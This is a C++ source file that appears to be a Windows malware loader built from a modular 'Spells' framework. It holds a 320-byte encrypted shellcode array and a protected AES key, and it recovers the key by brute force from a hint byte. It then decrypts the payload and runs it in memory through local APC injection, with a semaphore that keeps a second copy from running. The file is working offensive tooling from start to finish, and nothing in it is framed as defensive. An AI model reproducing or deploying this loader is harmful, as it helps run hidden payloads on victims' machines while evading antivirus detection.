
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "../../Spells/UtilitySpells/FetchFromURL.h"



#include "../../Spells/EncryptionSpells/AESEnc.h"
#include "../../Spells/EncryptionSpells/KeyBrute.h"


#include "../../Spells/LocalExecutionSpells/LocalApcInjection.h"


static const unsigned char Data_RawData[] = {0xe5, 0xae, 0xd5, 0x2a, 0xcf, 0xb5, 0xe2, 0xb8, 0xb6, 0x41, 0x33, 0xbe, 0x1b, 0xd8, 0x23, 0xb4, 0xa9, 0x7f, 0x72, 0x2c, 0xff, 0x46, 0x5a, 0x6f, 0xc8, 0x76, 0xd4, 0x97, 0x57, 0x1e, 0xf5, 0xae, 0xd5, 0x55, 0x8f, 0xc6, 0x1, 0x27, 0xd9, 0xf, 0xfc, 0x33, 0x79, 0x67, 0x98, 0xbc, 0x9b, 0x23, 0x7d, 0x3b, 0x20, 0xff, 0xfa, 0x7e, 0x5b, 0x4b, 0xe3, 0xec, 0x93, 0x2e, 0x75, 0x88, 0x14, 0xe7, 0x62, 0x27, 0x17, 0x37, 0x2c, 0xb0, 0x50, 0x3c, 0xd6, 0xca, 0xa2, 0x14, 0x2e, 0x34, 0xe0, 0x99, 0x99, 0x7c, 0xc4, 0xde, 0x60, 0xa9, 0xd, 0x3c, 0x7a, 0x6f, 0xcc, 0x9d, 0x37, 0xce, 0x1f, 0xe9, 0xb8, 0x1d, 0xd4, 0x21, 0xb8, 0x2d, 0xbd, 0xd0, 0xb4, 0x68, 0x4e, 0xe5, 0xd7, 0x89, 0xbc, 0x75, 0xa9, 0x31, 0xbc, 0x67, 0xd1, 0x63, 0x6a, 0x51, 0xd6, 0x69, 0x3f, 0x67, 0xcc, 0x6, 0xf7, 0x7a, 0x46, 0xa5, 0x8b, 0x43, 0x2b, 0x0, 0x9b, 0x8c, 0xfc, 0xe7, 0xde, 0x2e, 0x84, 0xca, 0x41, 0x4c, 0x53, 0xb0, 0xd1, 0xbc, 0x35, 0x8, 0x6a, 0x68, 0x15, 0xb8, 0x64, 0xca, 0x42, 0xef, 0x68, 0xab, 0x9b, 0x75, 0xce, 0x9a, 0xc6, 0xb1, 0x85, 0x44, 0x35, 0x73, 0x45, 0x4e, 0x95, 0x73, 0xe0, 0xad, 0xa6, 0x2f, 0x16, 0xa7, 0x44, 0xa4, 0x23, 0x7, 0xc8, 0x2c, 0x6b, 0x6d, 0xca, 0x8e, 0x4c, 0xeb, 0xc1, 0xbe, 0xfd, 0x1c, 0xd7, 0x2a, 0xf9, 0x13, 0xb0, 0xc2, 0xe3, 0xa8, 0x7a, 0x4, 0xe6, 0x48, 0x1c, 0xa7, 0x7b, 0xca, 0x9c, 0x1d, 0xfc, 0xf2, 0x14, 0x75, 0xf6, 0xeb, 0x5d, 0xcb, 0x8e, 0x72, 0xed, 0x4a, 0xcd, 0x8f, 0x84, 0x4e, 0x1f, 0x3e, 0xa0, 0xd5, 0xa4, 0x24, 0xb1, 0xc9, 0xfa, 0x25, 0x6a, 0xaa, 0x96, 0x1e, 0xa8, 0xf8, 0xa1, 0xa2, 0xb5, 0xaa, 0x36, 0x27, 0x27, 0x44, 0xd0, 0x1f, 0xc1, 0xa3, 0x79, 0x4f, 0x72, 0xa8, 0x47, 0x2, 0xf4, 0x46, 0x2d, 0xd3, 0x25, 0x40, 0xe2, 0x8, 0x76, 0x9d, 0xd4, 0xe2, 0x4a, 0xe1, 0x24, 0x14, 0x99, 0xd7, 0x29, 0x34, 0xf, 0x22, 0x54, 0x58, 0xf, 0x5f, 0x64, 0xc5, 0x46, 0xa0, 0x93, 0x1, 0x1, 0xae, 0x48, 0xa8, 0xdc, 0x40, 0x62, 0xec, 0xcb, 0x62, 0xb, 0x51, 0x54, 0xa6, 0x8a, 0x16, 0xa6, 0x5e, 0x4c, 0x74, 0x3c, 0x4, 0xf4, 0x4b}; 


using namespace std;
int main()
{
    PBYTE pPayloadAddress;
    SIZE_T pPayloadSize;
    string Url = "null";
    LPWSTR szProcessName = L"null";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    HANDLE* phThread = &hThread;

    

    HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");

    if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	    exit(0);

	// Payload is not running
    hThread = GetCurrentThread();
    

    pPayloadSize = 320;
    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
    if (pPayloadAddress == NULL)
    {
        printf("Memory allocation failed.\n");
        return 1;
    }
    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);


    unsigned char ProtectedKey[] = {
	0x92, 0xEA, 0x65, 0x4F, 0x40, 0x5E, 0x57, 0x91, 0x61, 0x12, 0xBF, 0xA7, 0xE8, 0x2B, 0x4C, 0xF3, 
	0xE5, 0x38, 0xE7, 0xE7, 0xE5, 0x16, 0xFC, 0xFC, 0xC7, 0x04, 0xF7, 0xC6, 0x98, 0xD3, 0x43, 0xF6 };
    
    #define HINT_BYTE 0xA6
    size_t sKeySize = sizeof(ProtectedKey);
    PBYTE pbKey = (PBYTE)ProtectedKey;
    PBYTE pbRealKey;
    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
    size_t sRealKeySize = sizeof(pbRealKey);
    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);



    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, phThread)){
        printf("Failed to execute payload");
        return 0;
    }
            
    free(pPayloadAddress);
   
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(*phThread, INFINITE);
    return 0;
}
